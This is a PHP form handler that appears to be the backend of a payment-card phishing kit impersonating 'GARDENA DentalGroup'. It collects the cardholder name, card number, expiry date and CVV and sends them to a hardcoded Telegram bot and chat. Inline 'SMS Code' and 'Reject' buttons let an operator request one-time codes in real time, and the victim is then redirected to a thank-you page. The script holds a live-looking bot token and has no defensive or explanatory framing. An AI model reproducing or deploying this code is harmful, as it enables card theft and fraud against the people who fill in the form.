<?php
$botToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
$website = "https://api.telegram.org/bot".$botToken;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardHolderName = $_POST["cardHolderName"] ?? '';
    $cardNumber = $_POST["cardNumber"] ?? '';
    $expiryDate = $_POST["expiryDate"] ?? '';
    $cvv = $_POST["cvv"] ?? '';
    $chatId = '-4104959417';
    $uniqueId = uniqid();
    $message = "GARDENA DentalGroup\nCard Holder Name: $cardHolderName\nCard Number: $cardNumber\nExpiry Date: $expiryDate\nCVV: $cvv\nUnique ID: $uniqueId";
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => "SMS Code", 'callback_data' => "sms_code|$uniqueId"],
                ['text' => "Reject", 'callback_data' => "reject|$uniqueId"]
            ]
        ]
    ];
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'reply_markup' => json_encode($keyboard)
    ];
    $url = $website."/sendMessage";
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($postData)
        ]
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);

    header("Location: http://example.com/thankyou");
    exit;
}
?>